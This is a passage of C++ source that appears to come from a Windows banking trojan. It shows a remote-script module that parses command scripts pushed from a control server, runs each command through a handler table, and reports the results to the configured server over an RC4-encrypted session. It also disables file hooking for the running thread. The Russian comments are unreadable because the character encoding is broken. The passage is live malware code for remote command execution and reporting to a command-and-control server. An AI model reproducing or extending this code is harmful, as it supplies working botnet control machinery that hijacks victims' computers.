    if(!LocalConfig::endReadWrite(localConfig) && localConfig != NULL)errorMessageId = CryptedStrings::id_remotescript_error_failed_to_save;
  }

  return errorMessageId;
}

/*
  ���������� �������.

  IN scriptText - ����� �������.
  OUT errorLine - ������ �� ������� ��������� ������, ��� (DWORD)-1 ���� ������ ��������� �� ��
                  ������.
  Return        - 0 - � ������ ������,
                  CryptedStrings::id_* - ������ �������.
*/
static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
{
  WORD errorMessageId = 0;
  LPWSTR *lines;
  DWORD linesCount = Str::_splitToStringsW(scriptText, Str::_LengthW(scriptText), &lines, Str::STS_TRIM, 0);
  //*errorLine = (DWORD)-1;
  
  if(linesCount == (DWORD)-1)
  {
    errorMessageId = CryptedStrings::id_remotescript_error_not_enough_memory;
    WDEBUG0(WDDT_ERROR, "_splitToStringsW failed.");
  }
  else
  {
    //����������� ������.
    for(DWORD i = 0; i < linesCount; i++)if(lines[i] != NULL && lines[i][0] != 0)
    {
      LPWSTR *args;
      DWORD argsCount = Str::_getArgumentsW(lines[i], Str::_LengthW(lines[i]), &args, 0);

      if(argsCount == (DWORD)-1)
      {
        errorMessageId = CryptedStrings::id_remotescript_error_not_enough_memory;
        WDEBUG0(WDDT_ERROR, "_getArgumentsW failed.");
        break;
      }
      else
      {
        if(argsCount > 0)
        {
          WCHAR commandNameBuffer[CryptedStrings::len_max];
          
          //���� �������.
          DWORD ci = 0;
          for(; ci < sizeof(commandData) / sizeof(COMMANDDATA); ci++)
          {
            CryptedStrings::_getW(commandData[ci].nameId, commandNameBuffer);
            if(CWA(kernel32, lstrcmpiW)(args[0], commandNameBuffer) == 0)
            {
              WDEBUG1(WDDT_INFO, "Executing command \"%s\".", commandNameBuffer);
              if(!commandData[ci].proc(args, argsCount))
              {
                WDEBUG1(WDDT_ERROR, "Command \"%s\" failed.", commandNameBuffer);
                errorMessageId = CryptedStrings::id_remotescript_error_command_failed;
                *errorLine   = i + 1;
              }
              break;
            }
          }

          //���� ������� �� �������.
          if(ci == sizeof(commandData) / sizeof(COMMANDDATA))
          {
            WDEBUG1(WDDT_INFO, "Unknown command \"%s\".", args[0]);
            errorMessageId = CryptedStrings::id_remotescript_error_command_unknown;
            *errorLine   = i + 1;
          }
        }
        Mem::freeArrayOfPointers(args, argsCount);
      }

      //���� ������� ������, ��������� ���������� �������.
      if(errorMessageId != 0)break;
    }
    Mem::freeArrayOfPointers(lines, linesCount);
  }

  return errorMessageId;
}

/*
  ����� ����� ��� ��������� �������.

  IN p   - BinStorage::STORAGE.

  Return - 0.
*/
static DWORD WINAPI scriptProc(void *p)
{
  CoreHook::disableFileHookerForCurrentThread(true);
  HANDLE mutex = Core::waitForMutexOfObject(Core::OBJECT_ID_REMOTESCRIPT, MalwareTools::KON_GLOBAL);
  if(mutex == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Failed.");
    return 1;
  }
  
  WDEBUG0(WDDT_INFO, "Started.");

  BinStorage::STORAGE *script = (BinStorage::STORAGE *)p;
  BinStorage::ITEM *curItem = NULL;
  LPBYTE currentHash;
  pendingFlags = 0;
  
  //����� ��������.
  while((curItem = BinStorage::_getNextItem(script, curItem)))if(curItem->realSize > MD5HASH_SIZE && (currentHash = (LPBYTE)BinStorage::_getItemData(curItem)) != NULL)
  {
    WDEBUG1(WDDT_INFO, "Founded script with size %u", curItem->realSize);

    //������� ������ � ���� �������.
    WORD errorMessageId = getScriptStatusByHash(currentHash);
    DWORD errorLine = (DWORD)-1;

    //���������� �������.
    if(errorMessageId == 0)
    {
      LPWSTR scriptText = Str::_utf8ToUnicode((LPSTR)((LPBYTE)currentHash + MD5HASH_SIZE), curItem->realSize - MD5HASH_SIZE);
      if(scriptText == NULL)
      {
        errorMessageId = CryptedStrings::id_remotescript_error_not_enough_memory;
        WDEBUG0(WDDT_ERROR, "_utf8ToUnicode failed.");
      }
      else
      {
        errorMessageId = executeScript(scriptText, &errorLine);
      }
      Mem::free(scriptText);
    }
    
    //�������� ������ �������.
    {
      BinStorage::STORAGE *config;
      if((config = DynamicConfig::getCurrent()))
      {
        LPSTR url = (LPSTR)BinStorage::_getItemDataEx(config, CFGID_URL_SERVER_0, BinStorage::ITEMF_IS_OPTION, NULL);
        Mem::free(config);

        if(url && *url != 0)
        {
          Crypt::RC4KEY rc4Key;
          {
            BASECONFIG baseConfig;
            Core::getBaseConfig(&baseConfig);
            Mem::_copy(&rc4Key, &baseConfig.baseKey, sizeof(Crypt::RC4KEY));
          }
          
          SCRIPTDATA scriptData;
          scriptData.errorMessageId = errorMessageId;
          scriptData.errorLine      = errorLine;
          scriptData.hash           = currentHash;

          Report::SERVERSESSION serverSession;
          serverSession.url         = url;
          serverSession.requestProc = requestProc;
          serverSession.resultProc  = resultProc;
          serverSession.stopEvent   = NULL;//coreData.globalHandles.stopEvent; //���� �� ������� ����������, �� ���� ���� �� ������ ��������� �����.
          serverSession.rc4Key      = &rc4Key;
          serverSession.postData    = NULL;
          serverSession.customData  = &scriptData;

          Report::startServerSession(&serverSession);
        }
        Mem::free(url);
      }
    }

    Mem::free(currentHash);
  }
  
  Mem::free(script);
  executePendingCommands();  
  WDEBUG0(WDDT_INFO, "Stopped.");
  Sync::_freeMutex(mutex);

  return 0;
}

bool RemoteScript::_exec(BinStorage::STORAGE *script)
{
  return (Process::_createThread(0, scriptProc, script) != 0);
}
